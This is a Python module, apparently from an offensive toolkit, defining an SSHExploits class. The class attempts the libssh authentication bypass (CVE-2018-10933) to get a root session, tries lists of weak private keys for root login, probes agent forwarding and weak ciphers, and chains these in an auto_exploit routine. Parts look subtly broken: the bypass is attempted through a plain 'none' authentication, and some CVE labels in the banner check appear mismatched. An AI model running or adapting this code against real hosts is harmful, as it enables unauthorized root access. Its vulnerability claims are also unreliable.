import paramiko
import socket
import logging
import time
from typing import Optional, Dict, List
from core.connector import SSHConnector
from core.utils import Utils
from core.obfuscator import Obfuscator

class SSHExploits:
    """SSH vulnerability exploitation module"""

    def __init__(self, config: Dict):
        self.config = config
        self.connector = SSHConnector(config)
        self.utils = Utils()
        self.obfuscator = Obfuscator(config)
        self.exploit_timeout = config.get('exploit_timeout', 30)
        self.target_ports = config.get('target_ports', [22, 2222, 22222])

    def check_libssh_auth_bypass(self, host: str, port: int = None) -> bool:
        """
        Exploit CVE-2018-10933 (libssh authentication bypass)
        Returns True if vulnerable
        """
        port = port or self.config.get('port', 22)
        try:
            sock = socket.socket()
            sock.settimeout(self.exploit_timeout)
            sock.connect((host, port))
            
            transport = paramiko.Transport(sock)
            transport.start_client()
            
            # Attempt auth bypass
            transport.auth_none('root')
            
            # Check if authentication was successful
            if transport.is_authenticated():
                transport.close()
                return True
                
        except Exception as e:
            logging.debug(f"libssh check failed: {str(e)}")
        return False

    def exploit_libssh_auth_bypass(self, host: str, port: int = None) -> Optional[paramiko.SSHClient]:
        """
        Exploit CVE-2018-10933 to gain unauthorized access
        Returns authenticated SSH client if successful
        """
        port = port or self.config.get('port', 22)
        try:
            sock = socket.socket()
            sock.settimeout(self.exploit_timeout)
            sock.connect((host, port))
            
            transport = paramiko.Transport(sock)
            transport.start_client()
            
            # Exploit the vulnerability
            transport.auth_none('root')
            
            if transport.is_authenticated():
                client = paramiko.SSHClient()
                client._transport = transport
                return client
                
        except Exception as e:
            logging.error(f"Exploit failed: {str(e)}")
        return None

    def check_ssh_version(self, host: str, port: int = None) -> Optional[Dict]:
        """Check SSH version for known vulnerabilities"""
        port = port or self.config.get('port', 22)
        try:
            sock = socket.socket()
            sock.settimeout(self.exploit_timeout)
            sock.connect((host, port))
            banner = sock.recv(1024).decode().strip()
            
            vulns = []
            if "OpenSSH 7.2" in banner:
                vulns.append("CVE-2017-15906 - RCE in OpenSSH 7.2")
            if "OpenSSH 7.7" in banner:
                vulns.append("CVE-2019-6111 - Command injection")
            if "libssh" in banner.lower():
                vulns.append("CVE-2018-10933 - Auth bypass")
                
            return {
                'banner': banner,
                'vulnerabilities': vulns
            }
        except Exception as e:
            logging.debug(f"Version check failed: {str(e)}")
        return None

    def weak_key_exploit(self, host: str, known_keys: List[str], port: int = None) -> Optional[paramiko.SSHClient]:
        """
        Exploit systems using known weak SSH keys
        (e.g., Debian weak key vulnerability)
        """
        port = port or self.config.get('port', 22)
        for key_path in known_keys:
            try:
                key = paramiko.RSAKey.from_private_key_file(key_path)
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    hostname=host,
                    port=port,
                    username='root',
                    pkey=key,
                    timeout=self.exploit_timeout
                )
                return client
            except Exception:
                continue
        return None

    def ssh_agent_hijack(self, host: str, port: int = None) -> bool:
        """
        Attempt SSH agent forwarding hijack
        Returns True if agent forwarding is enabled
        """
        port = port or self.config.get('port', 22)
        try:
            # This is just a check - actual exploitation would require
            # access to the SSH_AUTH_SOCK on a compromised machine
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host,
                port=port,
                username='root',
                timeout=self.exploit_timeout,
                allow_agent=True
            )
            
            transport = client.get_transport()
            if transport and transport.get_username() and transport.auth_agent():
                client.close()
                return True
                
            client.close()
        except Exception:
            pass
        return False

    def brute_force_ciphers(self, host: str, port: int = None) -> Optional[Dict]:
        """
        Test for weak cipher support
        Returns dict of supported ciphers if any weak ones found
        """
        weak_ciphers = [
            'aes128-cbc', 'aes192-cbc', 'aes256-cbc',
            '3des-cbc', 'blowfish-cbc', 'cast128-cbc',
            'arcfour', 'arcfour128', 'arcfour256'
        ]
        
        port = port or self.config.get('port', 22)
        results = {}
        
        for cipher in weak_ciphers:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                transport = paramiko.Transport((host, port))
                transport.start_client()
                
                # Try each cipher individually
                transport.get_security_options().ciphers = (cipher,)
                
                # Attempt authentication (will fail but we're checking cipher support)
                transport.auth_none('root')
                results[cipher] = True
                transport.close()
                
            except paramiko.SSHException as e:
                if 'No existing session' in str(e):
                    results[cipher] = True
                else:
                    results[cipher] = False
            except Exception:
                results[cipher] = False
                
        # Filter only supported weak ciphers
        supported = {k:v for k,v in results.items() if v}
        return supported if supported else None

    def run_scan(self, host: str) -> Dict:
        """Run all vulnerability checks against target"""
        results = {
            'target': host,
            'vulnerabilities': []
        }
        
        # Check all common ports if no specific port given
        ports = [self.config.get('port', 22)] if 'port' in self.config else self.target_ports
        
        for port in ports:
            port_result = {
                'port': port,
                'findings': []
            }
            
            # Version check
            version_info = self.check_ssh_version(host, port)
            if version_info:
                port_result['banner'] = version_info['banner']
                if version_info['vulnerabilities']:
                    port_result['findings'].extend([
                        {'type': 'vulnerability', 'details': vuln}
                        for vuln in version_info['vulnerabilities']
                    ])
            
            # libssh check
            if self.check_libssh_auth_bypass(host, port):
                port_result['findings'].append({
                    'type': 'vulnerability',
                    'details': 'CVE-2018-10933 - libssh authentication bypass'
                })
            
            # Weak cipher check
            weak_ciphers = self.brute_force_ciphers(host, port)
            if weak_ciphers:
                port_result['findings'].append({
                    'type': 'weak_config',
                    'details': f"Weak ciphers supported: {', '.join(weak_ciphers.keys())}"
                })
            
            # SSH agent check
            if self.ssh_agent_hijack(host, port):
                port_result['findings'].append({
                    'type': 'weak_config',
                    'details': 'SSH agent forwarding enabled'
                })
            
            if port_result['findings']:
                results['vulnerabilities'].append(port_result)
        
        return results

    def auto_exploit(self, host: str) -> Optional[paramiko.SSHClient]:
        """
        Automatically try all exploits against target
        Returns first successful SSH client connection
        """
        # Check all common ports if no specific port given
        ports = [self.config.get('port', 22)] if 'port' in self.config else self.target_ports
        
        for port in ports:
            # Try libssh exploit first
            if self.check_libssh_auth_bypass(host, port):
                client = self.exploit_libssh_auth_bypass(host, port)
                if client:
                    return client
            
            # Try weak keys if configured
            if 'weak_key_paths' in self.config:
                client = self.weak_key_exploit(
                    host,
                    self.config['weak_key_paths'],
                    port
                )
                if client:
                    return client
        
        return None